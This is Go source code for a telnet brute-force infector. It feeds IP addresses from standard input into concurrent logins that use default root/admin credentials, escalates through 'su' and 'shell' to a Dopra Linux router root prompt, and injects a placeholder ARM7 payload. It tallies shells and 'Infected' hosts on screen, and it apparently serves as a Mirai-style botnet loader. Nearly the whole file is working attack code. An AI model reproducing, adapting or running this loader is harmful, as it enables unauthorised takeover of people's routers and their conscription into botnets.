package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

var CONNECT_TIMEOUT time.Duration = 6
var READ_TIMEOUT time.Duration = 15
var WRITE_TIMEOUT time.Duration = 10
var syncWait sync.WaitGroup

var statusRebooted, statusInfected int

type scanner_info struct {
	username, password, ip, port, arch string
	bytebuf                            []byte
	err                                error
	resp, authed, attempt              int
	conn                               net.Conn
}

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func setWriteTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
}

func setReadTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
}

func (info *scanner_info) cleanupTarget() {

	zeroByte(info.bytebuf)
	info.username = ""
	info.password = ""
	info.arch = ""
	info.ip = ""
	info.port = ""
	info.err = nil
	info.resp = 0
	info.authed = 0
	info.attempt = 0
}

func readUntilString(connection net.Conn, toFind string) int {

	buf := make([]byte, 256)
	var found int = 0
	var startTime = time.Now().Unix()

	for {
		if time.Now().Unix() >= startTime+300 {
			break
		}

		connection.Read(buf)
		if strings.Contains(string(buf), toFind) {
			found = 1
			zeroByte(buf)
			break
		}

		zeroByte(buf)
		time.Sleep(1 * time.Second)
	}

	return found
}

func readUntilPrompt(connection net.Conn) int {

	buf := make([]byte, 256)
	var found int = 0
	var startTime = time.Now().Unix()

	for {
		if time.Now().Unix() >= startTime+6 {
			break
		}

		connection.Read(buf)
		if strings.Contains(string(buf), "$") || strings.Contains(string(buf), "%") || strings.Contains(string(buf), "#") || strings.Contains(string(buf), ":") || strings.Contains(string(buf), ">") {
			found = 1
			zeroByte(buf)
			break
		}

		zeroByte(buf)
		time.Sleep(1 * time.Second)
	}

	return found
}

func readUntilPassword(connection net.Conn) int {

	buf := make([]byte, 256)
	var found int = 0
	var startTime = time.Now().Unix()

	for {
		if time.Now().Unix() >= startTime+6 {
			break
		}

		connection.Read(buf)
		if strings.Contains(string(buf), "assword") || strings.Contains(string(buf), "ass word") {
			found = 1
			zeroByte(buf)
			break
		}
		zeroByte(buf)
		time.Sleep(1 * time.Second)
	}

	return found
}

func readUntilLogin(connection net.Conn) int {

	buf := make([]byte, 256)
	var found int = 0
	var startTime = time.Now().Unix()

	for {
		if time.Now().Unix() >= startTime+6 {
			break
		}

		connection.Read(buf)
		if strings.Contains(string(buf), "ogin") || strings.Contains(string(buf), "sername") {
			found = 1
			zeroByte(buf)
			break
		}
		zeroByte(buf)
	}

	return found
}

func processTarget(target string) {

	info := scanner_info{
		ip:       target,
		port:     "23",
		username: "root",
		password: "admin",
		arch:     "",
		bytebuf:  nil,
		err:      nil,
		resp:     0,
		authed:   0,
	}

	new_telnet, err := net.Dial("tcp", info.ip+":"+info.port)
	if err != nil {
		info.cleanupTarget()
		syncWait.Done()
		return
	}

	ret := readUntilPrompt(new_telnet)
	if ret != 1 {
		new_telnet.Close()
		info.cleanupTarget()
		syncWait.Done()
		return
	}

	new_telnet.Write([]byte(info.username + "\r\n"))
	ret = readUntilPrompt(new_telnet)
	if ret != 1 {
		new_telnet.Close()
		info.cleanupTarget()
		syncWait.Done()
		return
	}

	new_telnet.Write([]byte(info.password + "\r\n"))
	ret = readUntilString(new_telnet, "WAP>")
	if ret != 1 {
		new_telnet.Close()
		info.cleanupTarget()
		syncWait.Done()
		return
	}

	new_telnet.Write([]byte("su\r\n"))
	ret = readUntilString(new_telnet, "SU_WAP>")
	if ret != 1 {
		new_telnet.Close()
		info.cleanupTarget()
		syncWait.Done()
		return
	}

	new_telnet.Write([]byte("shell\r\n"))
	ret = readUntilString(new_telnet, "WAP(Dopra Linux) # ")
	if ret != 1 {
		new_telnet.Close()
		info.cleanupTarget()
		syncWait.Done()
		return
	}

	statusRebooted++
	fmt.Println(info.ip)
	new_telnet.Write([]byte("info.sh\r\n"))
	new_telnet.Write([]byte("#YOUR PAYLOAD HERE (ARM7)\r\n"))

	ret = readUntilString(new_telnet, "qazwsxedc") // read infection string to verify
	if ret != 1 {
		new_telnet.Close()
		info.cleanupTarget()
		syncWait.Done()
		return
	} //whats your net server? im retarded my bad xD

	statusInfected++
	new_telnet.Close()
	info.cleanupTarget()
	syncWait.Done()
	return
}

func main() {

	var i int = 0
	go func() {
		for {
			fmt.Printf("%d's | %d Shells | %d Infected\n", i, statusRebooted, statusInfected)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			go processTarget(scan.Text())
			syncWait.Add(1)
		}
	}
}
